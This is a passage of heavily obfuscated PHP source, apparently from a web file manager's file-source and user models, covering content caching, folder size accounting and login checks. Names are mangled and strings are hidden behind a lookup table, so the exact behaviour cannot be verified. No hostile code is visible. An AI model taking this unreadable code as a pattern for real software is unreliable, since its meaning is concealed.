Pinyin::get($õ°ŒÄ‘¥, $¾ÍõŠï[594]); } if (!$°…İü‹¾ && !$„ú‰û) { $µºåº¼[$¾ÍõŠï[465]] = null; $µºåº¼[$¾ÍõŠï[464]] = null; } $this->metaSet($ƒØÍî—¶, $µºåº¼); } public function getContent($§ù¢ÇÇ‘) { $ùß™ê­¼ =& $_SERVER[ÏéâËõ‘]; $ğ‹Í»àß = $this->fileInfoGet($§ù¢ÇÇ‘); if (!$ğ‹Í»àß) { return !1; } if ($ğ‹Í»àß[$ùß™ê­¼[76]] == 0) { return $ùß™ê­¼[12]; } $†¤îŠ¶Ä = $ùß™ê­¼[2130] . $ğ‹Í»àß[$ùß™ê­¼[176]]; if ($ğ‹Í»àß[$ùß™ê­¼[76]] <= 1024 * 10) { $¸ù¶ºş€ = Cache::get($†¤îŠ¶Ä); if (!$¸ù¶ºş€) { $¸ù¶ºş€ = IO::getContent($ğ‹Í»àß[$ùß™ê­¼[84]]); Cache::set($†¤îŠ¶Ä, $¸ù¶ºş€); } return $¸ù¶ºş€; } if (!$ğ‹Í»àß[$ùß™ê­¼[84]]) { return $ùß™ê­¼[12]; } return IO::getContent($ğ‹Í»àß[$ùß™ê­¼[84]]); } public function setDesc($¤ÈÀ¶ƒ±, $†§€Ãîã) { $ˆß©½í¹ =& $_SERVER[ÏéâËõ‘]; Model($ˆß©½í¹[570])->eventAddDesc($¤ÈÀ¶ƒ±, $†§€Ãîã); return $this->metaSet($¤ÈÀ¶ƒ±, $ˆß©½í¹[453], $†§€Ãîã); } public function setContent($§“Äœô, $È‘ÑšÌô = '') { $¡‚œòõŞ =& $_SERVER[ÏéâËõ‘]; $å—­˜» = $this->sourceInfo($§“Äœô); $–¢×‚å = $this->fileInfoGet($§“Äœô); if (!$–¢×‚å || !$å—­˜») { return !1; } $î¸„øØ© = Model($¡‚œòõŞ[471])->addFileByContent($È‘ÑšÌô, $å—­˜»[$¡‚œòõŞ[32]]); $âÀ¨˜ø¿ = $this->fileHistory($å—­˜», $î¸„øØ©[$¡‚œòõŞ[468]], $î¸„øØ©[$¡‚œòõŞ[76]]); if (!$âÀ¨˜ø¿) { return Model($¡‚œòõŞ[471])->remove($î¸„øØ©[$¡‚œòõŞ[468]]); } $this->folderSizeReset($å—­˜»[$¡‚œòõŞ[432]]); return !0; } public function fileSubstr($·õÏŞ§, $©‚»©—˜, $Š…ş¢à×) { $ÕÉôÑ¬“ = $this->fileInfoGet($·õÏŞ§); if (!$ÕÉôÑ¬“) { return !1; } return IO::fileSubstr($ÕÉôÑ¬“[$_SERVER[ÏéâËõ‘][84]], $©‚»©—˜, $Š…ş¢à×); } public function fileInfoGet($Óàë¦İÓ) { $í¾İŠû’ =& $_SERVER[ÏéâËõ‘]; $ùó¨Â‘² = $this->sourceInfo($Óàë¦İÓ); if (!$ùó¨Â‘² || $ùó¨Â‘²[$í¾İŠû’[410]]) { return !1; } $­­Œ²íã = $í¾İŠû’[474] . $ùó¨Â‘²[$í¾İŠû’[468]]; $¨ËÊ²«ó = _get(self::$cacheFileInfo, $­­Œ²íã); if ($¨ËÊ²«ó) { return $¨ËÊ²«ó; } $ÛÓÌÉÖş = Model($í¾İŠû’[471])->fileInfo($ùó¨Â‘²[$í¾İŠû’[468]]); if ($ÛÓÌÉÖş) { $ÛÓÌÉÖş[$í¾İŠû’[32]] = $ùó¨Â‘²[$í¾İŠû’[32]]; } self::$cacheFileInfo[$­­Œ²íã] = $ÛÓÌÉÖş; return $ÛÓÌÉÖş; } private function folderChildrenNumber($€ç˜Ã´€) { $ÌÕÚ”¹¶ =& $_SERVER[ÏéâËõ‘]; $áÃ±ˆàæ = $this->sourceInfo($€ç˜Ã´€); $ºû«ŠÙÑ = array($ÌÕÚ”¹¶[590] => array($ÌÕÚ”¹¶[550], $áÃ±ˆàæ[$ÌÕÚ”¹¶[521]] . $€ç˜Ã´€ . $ÌÕÚ”¹¶[551]), $ÌÕÚ”¹¶[587] => $áÃ±ˆàæ[$ÌÕÚ”¹¶[505]], $ÌÕÚ”¹¶[430] => intval($áÃ±ˆàæ[$ÌÕÚ”¹¶[431]]), $ÌÕÚ”¹¶[583] => 1); $øÀ™°Ò† = $this->where($ºû«ŠÙÑ)->count(); $Î¦ÜÎ™ = $this->where($ºû«ŠÙÑ)->where(array($ÌÕÚ”¹¶[583] => 0))->count(); return array($ÌÕÚ”¹¶[80] => $Î¦ÜÎ™, $ÌÕÚ”¹¶[81] => $øÀ™°Ò†); } public function pathInfo($£•²ÁŒÄ, $¼ à†‡ = false) { $´â›ÅĞü =& $_SERVER[ÏéâËõ‘]; $¼ à†‡ = !1; $£•²ÁŒÄ = intval($£•²ÁŒÄ); $»”ÓÕµ© = $´â›ÅĞü[461] . intval($¼ à†‡) . $´â›ÅĞü[386] . $£•²ÁŒÄ; $ĞşôÏ“ë = _get(self::$cachePathInfo, $»”ÓÕµ©); if ($ĞşôÏ“ë) { return $ĞşôÏ“ë; } $Û¹³ï• = $this->sourceInfo($£•²ÁŒÄ); if (!$Û¹³ï•) { return !1; } $Û¹³ï• = $this->_listDataApplyItem($Û¹³ï•, $¼ à†‡); self::$cachePathInfo[$»”ÓÕµ©] = $Û¹³ï•; return $Û¹³ï•; } public static $cachePathInfoMore = array(); public function pathInfoMore($¡û¦÷Öä) { $ŠïÔ–«Ö =& $_SERVER[ÏéâËõ‘]; $÷˜”‚¾ = _get(self::$cachePathInfoMore, $¡û¦÷Öä); if ($÷˜”‚¾) { return $÷˜”‚¾; } $ì€ÈÔšÃ = $this->pathInfo($¡û¦÷Öä); if (!$ì€ÈÔšÃ) { return !1; } if ($ì€ÈÔšÃ[$ŠïÔ–«Ö[410]] == $ŠïÔ–«Ö[88]) { $ì€ÈÔšÃ[$ŠïÔ–«Ö[79]] = $this->folderChildrenNumber($¡û¦÷Öä); } self::$cachePathInfoMore[$¡û¦÷Öä] = $ì€ÈÔšÃ; return $ì€ÈÔšÃ; } public function sourceInfo($Ûü«É) { $ˆÊÈŒ²¤ =& $_SERVER[ÏéâËõ‘]; if (!$Ûü«É) { return array(); } $Ûü«É = intval($Ûü«É); $öµ³«ˆ = $ˆÊÈŒ²¤[460] . $Ûü«É; $Š¯Ş¬ ä = _get(self::$cacheSourceInfo, $öµ³«ˆ); if ($Š¯Ş¬ ä) { return $Š¯Ş¬ ä; } $…ß¾¨ı = $this->where(array($ˆÊÈŒ²¤[402] => $Ûü«É))->find(); self::$cacheSourceInfo[$öµ³«ˆ] = $…ß¾¨ı; return self::$cacheSourceInfo[$öµ³«ˆ]; } public function sourceCacheClear($âÉîµ´ = false) { self::cacheClear($âÉîµ´); } public static function cacheClear($×¢ñÈôá = false) { $º¢¼çç” =& $_SERVER[ÏéâËõ‘]; if ($×¢ñÈôá == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$º¢¼çç”[460] . $×¢ñÈôá]); unset(self::$cachePathInfoMore[$×¢ñÈôá]); unset(self::$cachePathInfo[$º¢¼çç”[2131] . $×¢ñÈôá]); unset(self::$cachePathInfo[$º¢¼çç”[2132] . $×¢ñÈôá]); } public function metaSet($ŠŠØ¥µ, $ŠâÕ¨ì™ = null, $¯‘…ˆÏ = null) { $´Š×ŞÓÛ = parent::metaSet($ŠŠØ¥µ, $ŠâÕ¨ì™, $¯‘…ˆÏ); if ($´Š×ŞÓÛ) { $this->sourceCacheClear($ŠŠØ¥µ); } return $´Š×ŞÓÛ; } public function pathInfoByPath($³Îğéü¾, $Ä±ÂË®ú) { $¼ãŒĞèÚ =& $_SERVER[ÏéâËõ‘]; $´°ê‡Â× = !$Ä±ÂË®ú ? array() : explode($¼ãŒĞèÚ[8], trim($Ä±ÂË®ú, $¼ãŒĞèÚ[8])); $ŒşÇ¿Íµ = $³Îğéü¾; foreach ($´°ê‡Â× as $˜¶•İÓé) { $¯©¿À™Ì = array($¼ãŒĞèÚ[432] => $ŒşÇ¿Íµ, $¼ãŒĞèÚ[32] => $˜¶•İÓé); $ÖİÕäñ¾ = $this->where($¯©¿À™Ì)->select(); if (!$ÖİÕäñ¾) { return !1; } $ÖİÕäñ¾ = array_sort_by($ÖİÕäñ¾, $¼ãŒĞèÚ[431]); $ŒşÇ¿Íµ = $ÖİÕäñ¾[0][$¼ãŒĞèÚ[402]]; } return $this->pathInfo($ŒşÇ¿Íµ, !0); } protected function updateModifyTime($•´¢€ßâ) { $£­Úı‹Í =& $_SERVER[ÏéâËõ‘]; $·¬Éƒ­Í = defined($£­Úı‹Í[475]) ? USER_ID : $£­Úı‹Í[197]; if (!$•´¢€ßâ) { return; } if (!is_array($•´¢€ßâ)) { $•´¢€ßâ = array($•´¢€ßâ); } foreach ($•´¢€ßâ as $­º”¨Æ€ => $øìÔè½Ä) { $•´¢€ßâ[$­º”¨Æ€] = intval($øìÔè½Ä); $this->sourceCacheClear($øìÔè½Ä); } $É¿ï”‹õ = array($£­Úı‹Í[402] => array($£­Úı‹Í[7], $•´¢€ßâ)); $å·¿ò¡§ = array($£­Úı‹Í[589] => $·¬Éƒ­Í, $£­Úı‹Í[424] => time()); $this->where($É¿ï”‹õ)->save($å·¿ò¡§); } public function folderSizeReset($œ¡¸•¼ï, $üõ«—Ü¡ = false) { $§Ê÷ ×Î =& $_SERVER[ÏéâËõ‘]; if ($this->statusIgnoreResetSpace) { return; } $µëóü”ì = $this->sourceInfo($œ¡¸•¼ï); $Æ÷˜¨†Ñ = $§Ê÷ ×Î[2133] . $œ¡¸•¼ï; CacheLock::lock($Æ÷˜¨†Ñ, 20); if ($üõ«—Ü¡ === !1) { $this->sourceCacheClear($œ¡¸•¼ï); $µëóü”ì = $this->sourceInfo($œ¡¸•¼ï); $¯áÅŸïì = array($§Ê÷ ×Î[401] => $œ¡¸•¼ï, $§Ê÷ ×Î[430] => 0); $Öœ†½çÔ = $this->where($¯áÅŸïì)->sum($§Ê÷ ×Î[76]); $üõ«—Ü¡ = intval($Öœ†½çÔ) - intval($µëóü”ì[$§Ê÷ ×Î[76]]); } if ($üõ«—Ü¡ == 0) { return CacheLock::unlock($Æ÷˜¨†Ñ); } $Å±ù” = $this->parentLevelArray($µëóü”ì[$§Ê÷ ×Î[521]]); if (!$Å±ù”) { $Å±ù” = array(); } $Å±ù”[] = $µëóü”ì[$§Ê÷ ×Î[402]]; $¯áÅŸïì = array($§Ê÷ ×Î[402] => array($§Ê÷ ×Î[418], $Å±ù”)); if ($üõ«—Ü¡ < 0) { $¯áÅŸïì[$§Ê÷ ×Î[76]] = array($§Ê÷ ×Î[1020], abs($üõ«—Ü¡)); } $this->where($¯áÅŸïì)->setAdd($§Ê÷ ×Î[76], $üõ«—Ü¡); CacheLock::unlock($Æ÷˜¨†Ñ); $’ßŒ¼‰¢ = $§Ê÷ ×Î[2134] . $µëóü”ì[$§Ê÷ ×Î[411]] . $§Ê÷ ×Î[4] . $µëóü”ì[$§Ê÷ ×Î[505]]; $÷Û³¤Ãö = array($µëóü”ì[$§Ê÷ ×Î[411]], $µëóü”ì[$§Ê÷ ×Î[505]]); TaskRun::timeLimitCall($’ßŒ¼‰¢, $§Ê÷ ×Î[2135], $÷Û³¤Ãö, 1.5); } public function folderSizeResetChildren($âí¼È©) { $Øı¶¥¥÷ =& $_SERVER[ÏéâËõ‘]; $this->sourceCacheClear($âí¼È©); $ªƒö¹÷Õ = $this->sourceInfo($âí¼È©); $Î”ù¢«Ø = array($Øı¶¥¥÷[583] => 1, $Øı¶¥¥÷[587] => $ªƒö¹÷Õ[$Øı¶¥¥÷[505]], $Øı¶¥¥÷[590] => array($Øı¶¥¥÷[550], $ªƒö¹÷Õ[$Øı¶¥¥÷[521]] . $âí¼È© . $Øı¶¥¥÷[551])); $¦îÈ½ïà = $Øı¶¥¥÷[2136]; $»“ËéÚ· = $this->field($¦îÈ½ïà)->where($Î”ù¢«Ø)->select(); $Î”ù¢«Ø[$Øı¶¥¥÷[410]] = 0; $ƒ««¢Ã = $this->field($¦îÈ½ïà)->where($Î”ù¢«Ø)->select(); if (!$ƒ««¢Ã) { return; } $»“ËéÚ·[] = $ªƒö¹÷Õ; $»“ËéÚ· = array_to_keyvalue($»“ËéÚ·, $Øı¶¥¥÷[402]); foreach ($»“ËéÚ· as $áûÃÎã„ => $È‘²«Õ¾) { $»“ËéÚ·[$áûÃÎã„][$Øı¶¥¥÷[2137]] = $»“ËéÚ·[$áûÃÎã„][$Øı¶¥¥÷[76]]; $»“ËéÚ·[$áûÃÎã„][$Øı¶¥¥÷[76]] = 0; } foreach ($ƒ««¢Ã as $È‘²«Õ¾) { $óôÄÖÕÚ = $È‘²«Õ¾[$Øı¶¥¥÷[432]] . $Øı¶¥¥÷[12]; if (!isset($»“ËéÚ·[$óôÄÖÕÚ])) { continue; } if ($È‘²«Õ¾[$Øı¶¥¥÷[431]] == $»“ËéÚ·[$óôÄÖÕÚ][$Øı¶¥¥÷[431]]) { $»“ËéÚ·[$óôÄÖÕÚ][$Øı¶¥¥÷[76]] += $È‘²«Õ¾[$Øı¶¥¥÷[76]]; } } foreach ($»“ËéÚ· as $È‘²«Õ¾) { $œÁåÕ‘è = $this->parentLevelArray($È‘²«Õ¾[$Øı¶¥¥÷[521]]); foreach ($œÁåÕ‘è as $óôÄÖÕÚ) { $óôÄÖÕÚ = $óôÄÖÕÚ . $Øı¶¥¥÷[12]; if (!isset($»“ËéÚ·[$óôÄÖÕÚ])) { continue; } if ($È‘²«Õ¾[$Øı¶¥¥÷[431]] == $»“ËéÚ·[$óôÄÖÕÚ][$Øı¶¥¥÷[431]]) { $»“ËéÚ·[$óôÄÖÕÚ][$Øı¶¥¥÷[76]] += $È‘²«Õ¾[$Øı¶¥¥÷[76]]; } } } $¼†Ë‹ë¾ = array(); foreach ($»“ËéÚ· as $È‘²«Õ¾) { if ($È‘²«Õ¾[$Øı¶¥¥÷[76]] == $È‘²«Õ¾[$Øı¶¥¥÷[2137]]) { continue; } $¼†Ë‹ë¾[] = array($Øı¶¥¥÷[402], $È‘²«Õ¾[$Øı¶¥¥÷[402]], $Øı¶¥¥÷[76], $È‘²«Õ¾[$Øı¶¥¥÷[76]]); } $this->saveAll($¼†Ë‹ë¾); } public function userSpaceReset($®ÛõœŞ = false) { $Ş•—³æş =& $_SERVER[ÏéâËõ‘]; $¤ü‘Şºã = $this->where(array($Ş•—³æş[411] => self::TYPE_USER, $Ş•—³æş[505] => $®ÛõœŞ, $Ş•—³æş[410] => 0))->sum($Ş•—³æş[76]); $¤ü‘Şºã = !$¤ü‘Şºã || $¤ü‘Şºã <= 0 ? 0 : $¤ü‘Şºã; Model($Ş•—³æş[513])->userEdit($®ÛõœŞ, array($Ş•—³æş[1823] => $¤ü‘Şºã)); } public function targetSpaceUpdate($Ò«äƒÅ‡, $„Ùİé¢) { $Ä¢ãû÷ş =& $_SERVER[ÏéâËõ‘]; if (!$„Ùİé¢) { return; } if (!in_array($Ò«äƒÅ‡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ƒıñ£éô = $this->targetSpaceSize($Ò«äƒÅ‡, $„Ùİé¢); if ($Ò«äƒÅ‡ == self::TYPE_USER) { Model($Ä¢ãû÷ş[513])->userEdit($„Ùİé¢, array($Ä¢ãû÷ş[1823] => $ƒıñ£éô)); } else { if ($Ò«äƒÅ‡ == self::TYPE_GROUP) { Model($Ä¢ãû÷ş[522])->groupEdit($„Ùİé¢, array($Ä¢ãû÷ş[1823] => $ƒıñ£éô)); } } } public function targetSpaceSize($¹ÀÀ½³¿, $©ãº×) { $ß¿—ëôç =& $_SERVER[ÏéâËõ‘]; $õãÀÔïš = 0; $âÂ´èé = $this->sourceRoot($¹ÀÀ½³¿, $©ãº×, !0); foreach ($âÂ´èé as $ù•’×Ê‰) { if (!$ù•’×Ê‰) { continue; } $õãÀÔïš += floatval($ù•’×Ê‰[$ß¿—ëôç[76]]); $‹£åöƒÜ = array($ß¿—ëôç[590] => array($ß¿—ëôç[550], $ß¿—ëôç[531] . $ù•’×Ê‰[$ß¿—ëôç[402]] . $ß¿—ëôç[551])); $Û°É÷³— = Model($ß¿—ëôç[429])->field($ß¿—ëôç[417])->where($‹£åöƒÜ)->select(); $Û°É÷³— = array_to_keyvalue($Û°É÷³—, $ß¿—ëôç[12], $ß¿—ëôç[402]); $Û°É÷³— = array_unique(array_filter($Û°É÷³—)); if ($Û°É÷³—) { $‹£åöƒÜ = array($ß¿—ëôç[417] => array($ß¿—ëôç[418], $Û°É÷³—)); $õãÀÔïš += floatval($this->where($‹£åöƒÜ)->sum($ß¿—ëôç[76])); } } $õãÀÔïš = !$õãÀÔïš || $õãÀÔïš <= 0 ? 0 : $õãÀÔïš; return $õãÀÔïš; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($«³š¶ï«) { return $this->fileTypeProfile($«³š¶ï«, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¨³ÏÂ÷) { return $this->fileTypeProfile($¨³ÏÂ÷, SourceModel::TYPE_GROUP); } private function fileTypeProfile($·—Ê˜ñĞ, $²½¾Ñ£š) { $ºàªéâè =& $_SERVER[ÏéâËõ‘]; $Ÿõö½ş = $ºàªéâè[2138] . $·—Ê˜ñĞ . $ºàªéâè[11] . $²½¾Ñ£š; $íßª–ïï = Cache::get($Ÿõö½ş); if ($íßª–ïï) { return $íßª–ïï; } $«šåÅĞË = array($ºàªéâè[583] => 0); if ($·—Ê˜ñĞ != !1) { $«šåÅĞË[$ºàªéâè[505]] = $·—Ê˜ñĞ; $«šåÅĞË[$ºàªéâè[411]] = $²½¾Ñ£š; } $ÀóÈ½ûÀ = array(); $ÀóÈ½ûÀ[$ºàªéâè[2139]] = array($ºàªéâè[2140] => LNG($ºàªéâè[2139]), $ºàªéâè[2141] => $this->where($«šåÅĞË)->count(), $ºàªéâè[585] => $this->where($«šåÅĞË)->sum($ºàªéâè[76])); $˜íÚ¢ñ = KodIO::fileTypeList(); foreach ($˜íÚ¢ñ as $£‰£÷ùè => $À¯Ò„½) { $«šåÅĞË[$ºàªéâè[412]] = $this->fileTypeWhere($£‰£÷ùè); $ÀóÈ½ûÀ[$£‰£÷ùè] = array($ºàªéâè[2140] => $À¯Ò„½[$ºàªéâè[32]], $ºàªéâè[2141] => $this->where($«šåÅĞË)->count(), $ºàªéâè[585] => $this->where($«šåÅĞË)->sum($ºàªéâè[76])); } Cache::set($Ÿõö½ş, $ÀóÈ½ûÀ, 1200); return $ÀóÈ½ûÀ; } public function fileNameExist($¾½°êËú, $Ï„Àæ±) { $íô©ö¬ =& $_SERVER[ÏéâËõ‘]; $¸Î¿ï¯Ó = $this->where(array($íô©ö¬[432] => $¾½°êËú, $íô©ö¬[32] => $Ï„Àæ±, $íô©ö¬[431] => 0))->find(); return is_array($¸Î¿ï¯Ó) ? $¸Î¿ï¯Ó[$íô©ö¬[402]] : !1; } public function childList($ç„çÇ´Û) { $àÓ·ÏÍı =& $_SERVER[ÏéâËõ‘]; $•ôÌóÄÁ = $àÓ·ÏÍı[2116] . $ç„çÇ´Û; if (isset(self::$cacheChildList[$•ôÌóÄÁ])) { return self::$cacheChildList[$•ôÌóÄÁ]; } $Ã×ä¥¤ = array($àÓ·ÏÍı[432] => intval($ç„çÇ´Û), $àÓ·ÏÍı[431] => 0); $á³àØÀ = $this->where($Ã×ä¥¤)->select(); $á³àØÀ = $á³àØÀ ? $á³àØÀ : array(); self::$cacheChildList[$•ôÌóÄÁ] = $á³àØÀ; foreach ($á³àØÀ as $Ç¹„ıç­) { $•ôÌóÄÁ = $àÓ·ÏÍı[460] . $Ç¹„ıç­[$àÓ·ÏÍı[402]]; self::$cacheSourceInfo[$•ôÌóÄÁ] = $Ç¹„ıç­; } return $á³àØÀ; } public function fileNameAuto($Õ®´ÃÉì, $÷Ø·¯ûƒ, $‘Ü˜›éâ = REPEAT_RENAME, $ÔßØî¤î = false) { $ÖÏğƒü =& $_SERVER[ÏéâËõ‘]; $üí­÷Š³ = get_path_ext($÷Ø·¯ûƒ); $Òî”ï­µ = $üí­÷Š³ ? basename($÷Ø·¯ûƒ, $ÖÏğƒü[10] . $üí­÷Š³) . $ÖÏğƒü[2142] . $üí­÷Š³ : $÷Ø·¯ûƒ . $ÖÏğƒü[384]; $Á×ÙÌ¢¬ = array($ÖÏğƒü[432] => $Õ®´ÃÉì, $ÖÏğƒü[431] => 0, $ÖÏğƒü[32] => array($ÖÏğƒü[383], $Òî”ï­µ)); $´£‰ø˜µ = $this->field($ÖÏğƒü[32])->where($Á×ÙÌ¢¬)->select(); $…ãÏ¹šæ = array_to_keyvalue($´£‰ø˜µ, $ÖÏğƒü[12], $ÖÏğƒü[32]); return $this->fileNameAutoGet($…ãÏ¹šæ, $÷Ø·¯ûƒ, $‘Ü˜›éâ, $ÔßØî¤î); } public function fileNameAutoGet($„×ÏªÇÛ, $·‘ºÖ•÷, $¤Â¼òœÒ, $ Òäª‚‡) { $¬ùâşªÒ =& $_SERVER[ÏéâËõ‘]; if ($¤Â¼òœÒ == REPEAT_REPLACE || !$„×ÏªÇÛ || !in_array_not_case($·‘ºÖ•÷, $„×ÏªÇÛ) || $ Òäª‚‡ && $¤Â¼òœÒ != REPEAT_RENAME_FOLDER) { return $·‘ºÖ•÷; } if ($¤Â¼òœÒ == REPEAT_SKIP) { return !1; } $ï‚ßô‚ä = $¬ùâşªÒ[10] . get_path_ext($·‘ºÖ•÷); $ï‚ßô‚ä = $ï‚ßô‚ä == $¬ùâşªÒ[10] || $ Òäª‚‡ ? $¬ùâşªÒ[12] : $ï‚ßô‚ä; for ($»Û½ç®¸ = 1; $»Û½ç®¸ <= count($„×ÏªÇÛ) + 1; $»Û½ç®¸++) { $µ”ÑÓÈ = substr($·‘ºÖ•÷, 0, strlen($·‘ºÖ•÷) - strlen($ï‚ßô‚ä)); $ŸÙ¿Š†© = $µ”ÑÓÈ . "\50{$»Û½ç®¸}\x29{$ï‚ßô‚ä}"; if (!in_array_not_case($ŸÙ¿Š†©, $„×ÏªÇÛ)) { return $ŸÙ¿Š†©; } } } } goto DÍğõÔ°­†; aè„÷Œ ²: class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\x65" => "\165\x73\x65\162\137\x6d\x65\x74\141", "\x6d\145\x74\x61\106\x69\x65\154\144" => "\x75\x73\145\x72\111\x44"); protected $simpleField = "\x75\x73\145\x72\111\x44\x2c\x6e\151\143\x6b\x4e\141\x6d\x65\x2c\156\141\x6d\145\x2c\141\x76\x61\x74\x61\x72\54\163\x65\x78\x2c\163\x74\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÙàÄåì©) { $úêÖƒìÖ =& $_SERVER[ÏéâËõ‘]; $…ƒ’¥¿¿ = $úêÖƒìÖ[2277]; return array($úêÖƒìÖ[1912] => array($ÙàÄåì©[0], $…ƒ’¥¿¿), $úêÖƒìÖ[1914] => array($ÙàÄåì©[0], $…ƒ’¥¿¿), $úêÖƒìÖ[2278] => array($ÙàÄåì©[0], $…ƒ’¥¿¿)); } protected function getInfo($‚Ì¿Øç, $ùº‡é¥† = false) { $ÅÎ§á¬ = $this->getInfoSimple($‚Ì¿Øç); if (!is_array($ÅÎ§á¬)) { return array(); } if ($ùº‡é¥†) { return $this->_getInfoApply($ÅÎ§á¬); } return $this->cacheFunctionGet($_SERVER[ÏéâËõ‘][1916], $‚Ì¿Øç); } protected function getInfoFull($ı•ğë•, $Ù¢é³—í = false) { $”Òè¯š§ = $this->getInfoSimple($ı•ğë•); if (!is_array($”Òè¯š§)) { return array(); } if ($Ù¢é³—í) { return $this->_getInfoApply($”Òè¯š§, !0); } return $this->cacheFunctionGet($_SERVER[ÏéâËõ‘][2279], $ı•ğë•); } private function _getInfoApply($ƒ•éñ¼, $¯Õä·î = false) { $–˜Öåäü =& $_SERVER[ÏéâËõ‘]; if (!$ƒ•éñ¼) { return $ƒ•éñ¼; } $ëû‰øÌ¡ = md5($–˜Öåäü[2280] . $ƒ•éñ¼[$–˜Öåäü[894]] . $–˜Öåäü[2281] . $ƒ•éñ¼[$–˜Öåäü[32]]); $ƒ•éñ¼ = $this->_listDataApplyItem($ƒ•éñ¼); $Îƒ‡Ü®ı = Model($–˜Öåäü[1332])->metaGet($ƒ•éñ¼[$–˜Öåäü[86]][$–˜Öåäü[402]]); $ƒ•éñ¼[$–˜Öåäü[2282]] = $ëû‰øÌ¡; $ƒ•éñ¼[$–˜Öåäü[86]][$–˜Öåäü[2103]] = isset($Îƒ‡Ü®ı[$–˜Öåäü[2104]]) ? $Îƒ‡Ü®ı[$–˜Öåäü[2104]] : null; if ($¯Õä·î) { $ƒ•éñ¼[$–˜Öåäü[466]] = $this->metaGet($ƒ•éñ¼[$–˜Öåäü[1662]]); } return $ƒ•éñ¼; } protected function getInfoSimple($‹£Ğù…, $°®˜•¾‡ = false) { $µşèÌÀ =& $_SERVER[ÏéâËõ‘]; if (!$‹£Ğù…) { return array(); } if ($°®˜•¾‡) { $¶ª¾ÏÍ = $this->where(array($µşèÌÀ[1662] => intval($‹£Ğù…)))->find(); if (!is_array($¶ª¾ÏÍ)) { return array(); } $¶ª¾ÏÍ[$µşèÌÀ[543]] = Action($µşèÌÀ[2283])->parseUrl($¶ª¾ÏÍ[$µşèÌÀ[543]]); return $¶ª¾ÏÍ; } return $this->cacheFunctionGet($µşèÌÀ[1917], $‹£Ğù…); } protected function getInfoSimpleOuter($¥çäİÔ¥) { $öæöÒ×¥ =& $_SERVER[ÏéâËõ‘]; if (!$¥çäİÔ¥ || $¥çäİÔ¥ == 0) { return array($öæöÒ×¥[1662] => $öæöÒ×¥[197], $öæöÒ×¥[32] => $öæöÒ×¥[162] . LNG($öæöÒ×¥[2284]) . $öæöÒ×¥[164], $öæöÒ×¥[543] => STATIC_PATH . $öæöÒ×¥[2285]); } $Ñâ†Øƒƒ = $this->cacheFunctionGet($öæöÒ×¥[1917], $¥çäİÔ¥); $ğï²©“ı = array_field_key($Ñâ†Øƒƒ, explode($öæöÒ×¥[50], $this->simpleField)); if (!$ğï²©“ı) { return array($öæöÒ×¥[1662] => $öæöÒ×¥[1195], $öæöÒ×¥[32] => $öæöÒ×¥[162] . LNG($öæöÒ×¥[2286]) . $öæöÒ×¥[164], $öæöÒ×¥[543] => STATIC_PATH . $öæöÒ×¥[2287]); } $ğï²©“ı[$öæöÒ×¥[543]] = Action($öæöÒ×¥[2283])->parseUrl($ğï²©“ı[$öæöÒ×¥[543]]); return $ğï²©“ı; } protected function groupUser($åÀÚ£üš) { } public static function errorLang($‚Êòš±ï) { $ÄŒé¾»ä =& $_SERVER[ÏéâËõ‘]; $¸¼—¾ = array(self::ERROR_USER_NOT_EXISTS => $ÄŒé¾»ä[2288], self::ERROR_USER_PASSWORD_ERROR => $ÄŒé¾»ä[2289], self::ERROR_USER_EXIST_NAME => $ÄŒé¾»ä[2290], self::ERROR_USER_EXIST_PHONE => $ÄŒé¾»ä[2291], self::ERROR_USER_EXIST_EMAIL => $ÄŒé¾»ä[2292], self::ERROR_USER_LOGIN_LOCK => $ÄŒé¾»ä[2293], self::ERROR_IP_NOT_ALLOW => $ÄŒé¾»ä[2294], self::ERROR_USER_EXIST_NICKNAME => $ÄŒé¾»ä[2295]); return LNG($¸¼—¾[$‚Êòš±ï]); } public function getInfoByMeta($êÆĞÜ¼Ü, $³Œ²üó÷) { $åÛÚ‹ª¡ =& $_SERVER[ÏéâËõ‘]; $óí¡Í–é = Model($åÛÚ‹ª¡[2296])->where(array($åÛÚ‹ª¡[94] => $êÆĞÜ¼Ü, $åÛÚ‹ª¡[374] => $³Œ²üó÷))->find(); if ($óí¡Í–é) { return $this->getInfo($óí¡Í–é[$åÛÚ‹ª¡[1662]]); } return !1; } public function userLoginCheck($ãàãšòÚ, $ºäÒ¯¹¼) { $îç¸Í =& $_SERVER[ÏéâËõ‘]; $ìá¸ƒôõ = $this->userLoginFind($ãàãšòÚ); if (!$ìá¸ƒôõ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ìá¸ƒôõ[$îç¸Í[1662]], $ºäÒ¯¹¼)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ìá¸ƒôõ[$îç¸Í[1662]]); } public function userLoginFind($Ë¾­€™¶) { $Ş˜Øé¤É =& $_SERVER[ÏéâËõ‘]; $ú„¥İí• = array($Ş˜Øé¤É[32] => $Ë¾­€™¶, $Ş˜Øé¤É[542] => $Ë¾­€™¶, $Ş˜Øé¤É[305] => $Ë¾­€™¶, $Ş˜Øé¤É[2297] => $Ë¾­€™¶, $Ş˜Øé¤É[1005] => $Ş˜Øé¤É[1007]); if ($this->nickNameRpt()) { unset($ú„¥İí•[$Ş˜Øé¤É[542]]); } return $this->where($ú„¥İí•)->find(); } public function clearCache($ª²ÊÌÛ‹) { $•–Ù÷‡² =& $_SERVER[ÏéâËõ‘]; $this->cacheFunctionClear($•–Ù÷‡²[1916], $ª²ÊÌÛ‹); $this->cacheFunctionClear($•–Ù÷‡²[1917], $ª²ÊÌÛ‹); $this->cacheFunctionClear($•–Ù÷‡²[2279], $ª²ÊÌÛ‹); } public function userPasswordCheck($‹øÛ“„, 